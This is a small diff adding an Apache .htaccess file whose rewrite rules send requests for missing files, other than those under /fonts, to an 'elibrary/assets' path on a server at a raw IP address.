@@ -1,0 +1,11 @@
+
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+
+RewriteCond %{REQUEST_URI} !^/fonts
+RewriteRule ^(.*)$ http://103.101.225.139/m4n3riq/elibrary/assets/$1 [L]
+
+</IfModule>
+
